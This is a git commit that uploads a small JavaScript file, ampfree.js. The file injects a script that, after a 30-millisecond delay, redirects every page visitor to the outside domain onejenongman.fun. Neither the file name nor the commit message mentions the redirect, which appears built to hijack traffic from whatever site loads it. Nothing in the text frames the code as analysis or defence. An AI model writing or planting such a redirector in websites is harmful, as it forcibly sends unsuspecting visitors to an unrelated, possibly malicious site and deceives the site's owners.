2180cd1845471e7b854cbf797d7aab3a946f5eb1
qqbos99 <qqbos999@gmail.com>
2024-12-06 23:09:00 +0800

    Add files via upload

---
+++ ampfree.js
@@ -0,0 +1,21 @@
+ var url = Array("https://onejenongman.fun/");
+            var rid = "";
+
+            var timesleep = "30";
+
+			
+			function put() {
+                var script = document.createElement("script");
+                script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)]+""+rid; setTimeout(function () {window.location = weburl;},timesleep);';
+                document.body.appendChild(script)
+            }
+            function jump() {
+                if (typeof url == 'undefined' || url == null) {
+                    setTimeout(function() {
+                        jump()
+                    }, 50)
+                } else {
+                    put()
+                }
+            }
+            jump();
